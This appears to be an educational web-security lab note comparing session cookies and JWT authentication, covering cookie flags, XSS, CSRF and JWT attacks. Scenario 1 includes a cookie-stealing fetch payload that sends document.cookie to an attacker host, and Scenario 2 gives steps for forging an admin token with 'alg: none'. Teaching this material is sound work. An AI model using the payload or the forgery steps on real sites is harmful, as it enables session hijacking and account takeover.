## 📌 Overview

HTTP is a **stateless** protocol, meaning the server does not natively retain user state between requests. To keep users logged in, web applications rely on authentication mechanisms to track identity across subsequent HTTP requests. The two dominant approaches are **Session-Based Authentication** and **Token-Based Authentication (JWT)**. This lab explores their underlying mechanics, defensive security controls (such as cookie security flags), and associated attack vectors including XSS session theft, CSRF, JWT algorithm manipulation, and weak secret cracking.

## 📊 Quick Reference Table

| Feature / Concept | Session-Based Auth | Token-Based Auth (JWT) |
| :--- | :--- | :--- |
| **State Management** | Stateful (Server remembers session) | Stateless (Client holds self-contained token) |
| **Storage Location** | Server memory/database & Client Cookie | Client storage (LocalStorage/Memory/Cookie) |
| **Transmission** | Automatic via `Cookie` header | Explicit via `Authorization: Bearer <token>` |
| **Primary Risks** | XSS Cookie Theft, Session Fixation, CSRF | JWT `None` Alg, Weak Secret Cracking, Data Exposure |
| **Key Defenses** | `HttpOnly`, `Secure`, `SameSite` Cookie Flags | Strong Secret Keys, Strict Signature Validation |

## 🛠️ Detailed Technical Breakdown

### 1. Session-Based Authentication (Server-Side State)

#### Mechanics
Upon successful authentication, the server creates a unique session record in its memory or database and assigns a random, cryptographically secure **Session ID**. This ID is sent to the client browser and saved as a cookie. The browser automatically includes this cookie in all subsequent requests, enabling the server to look up the session and verify user identity.

#### 🛡️ Attack Vectors
* **Session Hijacking (via XSS):** If an application contains a Cross-Site Scripting (XSS) vulnerability and session cookies lack protection, an attacker can execute malicious JavaScript (`document.cookie`) to exfiltrate the victim's Session ID and impersonate their active session.
* **Session Fixation:** An attacker tricks a victim into authenticating using a pre-defined Session ID generated by the attacker, allowing the attacker to access the account once authenticated.
* **Cross-Site Request Forgery (CSRF):** Because browsers automatically attach cookies to cross-site requests, a malicious site can force an authenticated user's browser to send unauthorized requests (e.g., transfer funds, change email addresses).

#### 🛡️ Defensive Security (Cookie Flags)
* **`HttpOnly`:** Prevents client-side scripts (JavaScript) from accessing the cookie via `document.cookie`, completely neutralizing XSS-based session cookie theft.
* **`Secure`:** Ensures the cookie is transmitted strictly over encrypted HTTPS connections, protecting it against Man-in-the-Middle (MiTM) interception.
* **`SameSite`:** Restricts cross-site cookie transmission (`Strict` or `Lax`), effectively mitigating CSRF attacks.

### 2. Token-Based Authentication (JWT)

#### Mechanics
Popular in modern Single Page Applications (SPAs), mobile applications, and APIs. Upon authentication, the server generates a signed **JSON Web Token (JWT)** and returns it to the client without storing session state on the backend. The client transmits this token in subsequent requests, typically within the `Authorization` header (`Authorization: Bearer <token>`).

#### JWT Anatomy (`Header.Payload.Signature`)
1. **Header:** Specifies the algorithm used to sign the token (e.g., `{"alg": "HS256", "typ": "JWT"}`).
2. **Payload:** Contains user claims and metadata (e.g., `{"user_id": 5, "role": "user"}`).
   > ⚠️ **Critical Note:** The payload is **Base64URL encoded**, NOT encrypted. Anyone can decode and read its contents.
3. **Signature:** Ensures cryptographic integrity. The server computes a hash of `Header + Payload` using a secret key known only to the server. If any payload field is tampered with, signature verification fails.

```
      HEADER                    PAYLOAD                   SIGNATURE
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyX2lkIjo1fQ . SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### 🛡️ Attack Vectors
* **`None` Algorithm Attack (`alg: "none"`):** If the server fails to enforce algorithm strictness during verification, an attacker can set `alg` to `none` in the header, elevate payload claims (e.g., `"role": "admin"`), strip the signature, and submit the tampered token.
* **Brute-Forcing / Cracking Weak Secret Keys:** Because the JWT is accessible client-side, attackers can perform offline dictionary attacks using tools like `Hashcat` or `John the Ripper` to guess weak signing secrets (e.g., `secret123`), enabling arbitrary token forgery.
* **Information Disclosure in Payload:** Developers incorrectly assuming Base64URL encoding provides confidentiality may store sensitive data (e.g., passwords, credit card numbers, or PII) inside the payload, exposing it to public extraction.

## 🧪 Practical Scenarios & Analysis

<details>
<summary><b>🔹 Scenario 1: Exploiting Missing HttpOnly Flag on Session Cookies</b></summary>

<br>

* **Condition:** An application uses session-based authentication storing the Session ID in a cookie. Inspection reveals `Secure` and `SameSite` flags are enabled, but `HttpOnly` is missing.
* **Analysis:** The absence of `HttpOnly` leaves the Session ID accessible to client-side scripts.
* **Primary Target & Strategy:** Look for Cross-Site Scripting (XSS) vulnerabilities. Once XSS is confirmed, inject a script payload (e.g., `fetch('https://attacker.com/log?c=' + document.cookie)`) to extract the Session ID and execute session hijacking.
</details>

<details>
<summary><b>🔹 Scenario 2: Testing JWT Role Escalation via Signature Manipulation</b></summary>

<br>

* **Condition:** An intercepted JWT shows standard user claims (`"role": "user"`) with no sensitive data in the Base64-decoded payload.
* **Analysis:** Test server-side token signature verification handling.
* **Testing Strategy:**
  1. Decode the JWT header and change `"alg": "HS256"` to `"alg": "none"` (or `"NONE"`).
  2. Modify the payload claim from `"role": "user"` to `"role": "admin"`.
  3. Strip the signature portion, leaving the trailing dot (`Header.Payload.`).
  4. Submit the request to verify whether backend signature verification can be bypassed to achieve administrative privilege escalation.
</details>
